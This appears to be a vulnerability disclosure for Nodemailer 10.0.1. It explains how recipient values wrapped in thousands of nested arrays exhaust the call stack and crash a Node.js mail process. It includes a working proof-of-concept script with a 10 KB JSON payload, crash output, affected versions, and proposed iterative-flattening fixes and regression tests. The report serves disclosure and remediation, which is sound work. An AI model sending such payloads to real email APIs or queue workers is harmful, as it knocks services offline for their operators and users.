@@ -1,0 +1,282 @@
+Nodemailer 10.0.1 does not safely process deeply nested arrays supplied through recipient fields such as to, cc, and bcc.
+
+The public MimeNodeAddressInput type recursively permits arrays, but MimeNode._parseAddresses() flattens only the outermost array. A remaining nested array is passed to addressparser(), whose Tokenizer coerces the input with .toString(). Native Array.prototype.toString() recursively processes every nested array through join() and toString() until the V8 call stack is exhausted.
+
+A valid 10,021-byte JSON recipient value containing one address wrapped in 5,000 arrays causes:
+
+RangeError: Maximum call stack size exceeded
+The exception occurs through the normal sendMail() API before the maxRecipients limit is evaluated. If the integrating application does not catch the synchronous exception around the complete sendMail() invocation, the Node.js worker or server process terminates.
+
+No SMTP server, remote host, large attachment, or successful email delivery is required.
+
+This is distinct from GHSA-rcmh-qjqh-p98v / CVE-2025-14874. The previous vulnerability concerned recursive parsing of RFC 5322 group strings. This report uses Nodemailer's structured recipient-array input and never reaches the parser's MAX_NESTED_GROUP_DEPTH protection.
+
+Security impact
+An attacker who can control a recipient field passed to Nodemailer can trigger stack exhaustion using a roughly 10 KB JSON value. Potentially affected integrations include:
+
+Email-sending HTTP APIs that accept structured recipient values.
+Notification workers consuming JSON jobs from a queue.
+Template or automation systems that forward parsed recipient data to sendMail().
+Multi-tenant applications that allow users to configure message recipients.
+When the exception is not caught, a single request or queue item can terminate the process handling mail. A process manager may restart the worker, but repeated malicious inputs can keep workers in a restart loop and make the service unavailable.
+
+Applications that explicitly validate recipient values as flat strings or flat arrays before calling Nodemailer are not exposed through this path. Applications that wrap the complete synchronous sendMail() invocation in exception handling can prevent process termination, although an attacker can still repeatedly force failed jobs.
+
+Attack prerequisites
+The vulnerability is reachable when:
+
+An application accepts attacker-controlled or partially attacker-controlled recipient data.
+The application preserves the array structure after parsing JSON.
+The resulting value is passed to a Nodemailer recipient field such as to, cc, or bcc.
+The application does not impose its own nesting-depth limit before calling Nodemailer.
+The proof of concept uses jsonTransport only to avoid requiring an SMTP server. The vulnerable address normalization and envelope construction occur before transport-specific delivery, so the root cause is not limited to jsonTransport.
+
+Technical details
+1. The public input type accepts recursively nested arrays
+At src/mime-node/index.ts:67, recipient input is recursively defined:
+
+export type MimeNodeAddressInput = string | MimeNodeAddress | MimeNodeAddressInput[];
+Pinned source:
+
+https://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/mime-node/index.ts#L67
+
+This permits values equivalent to:
+
+[[[[['victim@example.test']]]]]
+2. _parseAddresses() removes only the outermost array
+At src/mime-node/index.ts:1359-1385, _parseAddresses() wraps the input with [].concat(addresses) and iterates the resulting outer array:
+
+_parseAddresses(addresses: MimeNodeAddressInput | undefined): MimeNodeAddress[] {
+    const flattened: MimeNodeAddress[] = [];
+
+    ([] as any[]).concat(addresses).forEach(address => {
+        if (address && address.address) {
+            const normalized = this._normalizeAddress(address.address);
+            // ...
+            return;
+        }
+
+        const parsed = this._normalizeParsedAddresses(addressparser(address));
+        for (let i = 0; i < parsed.length; i++) {
+            flattened.push(parsed[i]);
+        }
+    });
+
+    return flattened;
+}
+Pinned source:
+
+https://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/mime-node/index.ts#L1359-L1386
+
+For an input nested 5,000 levels deep, the callback receives an array nested 4,999 levels deep. Because this value does not have a truthy .address property, it is passed directly to addressparser().
+
+3. Tokenizer invokes recursive native array conversion
+The Tokenizer constructor performs the following coercion at src/addressparser/index.ts:393:
+
+this.str = (str || '').toString();
+Pinned source:
+
+https://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/addressparser/index.ts#L393
+
+When str is an array, this invokes Array.prototype.toString(). Array string conversion invokes join(), which converts every nested element to a string. Deeply nested arrays therefore produce native recursion resembling:
+
+Array.toString
+  -> Array.join
+     -> childArray.toString
+        -> Array.join
+           -> childArray.toString
+              -> ...
+At sufficient depth, V8 raises RangeError: Maximum call stack size exceeded.
+
+4. The recipient limit is applied too late
+Nodemailer's maxRecipients protection is evaluated only after the message envelope has been constructed:
+
+const recipientCount = mail.message.getEnvelope().to.length;
+Pinned source:
+
+https://github.com/nodemailer/nodemailer/blob/40d52215aac65b811d7e131bc916f68605efd9d2/src/mailer/index.ts#L414-L417
+
+The exception occurs inside getEnvelope(), so maxRecipients cannot prevent this condition.
+
+Vulnerable code path
+transporter.sendMail(message)
+  -> MailComposer(mail.data).compile()
+  -> mail.message.getEnvelope()
+  -> MimeNode._parseAddresses(message.to)
+  -> addressparser(nestedArray)
+  -> new Tokenizer(nestedArray)
+  -> nestedArray.toString()
+  -> Array.join / Array.toString recursion
+  -> RangeError: Maximum call stack size exceeded
+Proof of concept
+Test environment
+Operating system: Windows 11
+Node.js: 20.20.2
+Nodemailer: 10.0.1
+Nodemailer commit: 40d52215aac65b811d7e131bc916f68605efd9d2
+Transport: jsonTransport
+Installation
+mkdir nodemailer-nested-array-poc
+cd nodemailer-nested-array-poc
+npm init -y
+npm install nodemailer@10.0.1
+Create poc.mjs:
+
+import nodemailer from 'nodemailer';
+
+const depth = Number(process.argv[2] || 5000);
+
+// Valid JSON containing one address wrapped in `depth` arrays.
+const json =
+    '['.repeat(depth) +
+    '"victim@example.test"' +
+    ']'.repeat(depth);
+
+const recipient = JSON.parse(json);
+
+console.log({
+    nodemailerVersion: '10.0.1',
+    depth,
+    jsonBytes: Buffer.byteLength(json)
+});
+
+const transport = nodemailer.createTransport({
+    jsonTransport: true
+});
+
+await transport.sendMail({
+    from: 'sender@example.test',
+    to: recipient,
+    subject: 'Nested recipient array PoC',
+    text: 'test'
+});
+
+console.log('sendMail resolved');
+Trigger
+node poc.mjs 5000
+Observed result
+{
+  nodemailerVersion: '10.0.1',
+  depth: 5000,
+  jsonBytes: 10021
+}
+
+node:internal/modules/run_main:123
+    triggerUncaughtException(
+    ^
+
+RangeError: Maximum call stack size exceeded
+    at Array.join (<anonymous>)
+    at Array.toString (<anonymous>)
+    at Array.join (<anonymous>)
+    at Array.toString (<anonymous>)
+    at Array.join (<anonymous>)
+    at Array.toString (<anonymous>)
+    ...
+
+Node.js v20.20.2
+The tested process exits with status code 1.
+
+Control case
+Running the same code with a nesting depth of 500 succeeds:
+
+node poc.mjs 500
+Observed result:
+
+{
+  nodemailerVersion: '10.0.1',
+  depth: 500,
+  jsonBytes: 1021
+}
+
+sendMail resolved
+The difference between the trigger and control cases is only the nesting depth.
+
+Reproduction notes
+The exact failure depth is platform and runtime dependent because JavaScript stack limits vary.
+A depth of 5,000 reliably reproduced the exception in the tested Node.js environment.
+The payload is generated as JSON and parsed with native JSON.parse() to model data received by an HTTP API or queue worker.
+No network connection is performed because jsonTransport is used.
+Version verification
+The proof of concept was executed against several released versions. Each listed version exited with RangeError: Maximum call stack size exceeded at a depth of 5,000:
+
+Nodemailer version	Result
+2.7.2	Vulnerable
+3.0.0	Vulnerable
+7.0.11	Vulnerable
+9.1.1	Vulnerable
+10.0.1	Vulnerable
+Version 7.0.11 is significant because it contains the fix for the previous string-group recursion advisory. Its failure confirms that this report describes a separate surviving path.
+
+The proposed affected range is >= 2.7.2, <= 10.0.1, representing the versions directly confirmed during testing and the continuous vulnerable implementation observed in source history. Earlier releases were not assessed and should not be considered confirmed safe.
+
+Difference from GHSA-rcmh-qjqh-p98v / CVE-2025-14874
+The previous advisory used a crafted address string containing nested RFC 5322 groups:
+
+g0: g1: g2: ... victim@example.com;
+Its recursive path was:
+
+addressparser(string)
+  -> _handleAddress()
+  -> addressparser(nested group string)
+That issue was mitigated by adding and propagating a parser recursion-depth counter capped by MAX_NESTED_GROUP_DEPTH.
+
+This report instead supplies a structured JSON array through the public recipient input:
+
+MimeNode._parseAddresses(array)
+  -> addressparser(array)
+  -> Tokenizer
+  -> Array.prototype.toString()
+The array conversion happens before any RFC 5322 group parsing. Consequently:
+
+No sequence of nested group delimiters is required.
+_handleAddress() is not the source of recursion.
+The _depth parser option is not incremented.
+MAX_NESTED_GROUP_DEPTH is never consulted.
+Releases containing the previous fix remain vulnerable.
+Previous advisory:
+
+GHSA-rcmh-qjqh-p98v
+
+Suggested remediation
+Flatten MimeNodeAddressInput values iteratively before passing scalar values to addressparser(). Nested arrays should never be implicitly converted to strings.
+
+For example, the implementation can maintain an explicit work stack:
+
+const pending: unknown[] = [addresses];
+const seenArrays = new WeakSet<object>();
+
+while (pending.length) {
+    const value = pending.pop();
+
+    if (Array.isArray(value)) {
+        if (seenArrays.has(value)) {
+            throw new TypeError('Cyclic recipient array');
+        }
+        seenArrays.add(value);
+
+        for (let i = value.length - 1; i >= 0; i--) {
+            pending.push(value[i]);
+        }
+        continue;
+    }
+
+    // Process only scalar strings and structured address objects here.
+}
+Additional hardening options include:
+
+Reject array nesting above an explicit maximum before any coercion.
+Reject unsupported recipient value types instead of passing them to addressparser().
+Catch address-normalization exceptions and report them through the normal sendMail() callback or rejected Promise.
+Apply input-complexity checks before constructing the envelope and before evaluating maxRecipients.
+An iterative implementation is preferable because the public TypeScript type is recursive and indicates that nested array structures are accepted inputs. Cycle detection remains necessary for direct JavaScript callers because cyclic arrays cannot originate from JSON but can be constructed in memory.
+
+Suggested regression tests
+The fix should cover:
+
+Deeply nested arrays containing one valid address, completing iteratively or failing with a controlled Nodemailer error.
+Nested inputs through to, cc, bcc, replyTo, and explicit envelope fields.
+A cyclic JavaScript recipient array.
+Ordinary flat strings and arrays, preserving existing behavior.
+Arrays containing structured { name, address } objects.
+Confirmation that failures reach the callback or rejected Promise instead of escaping the documented error path.
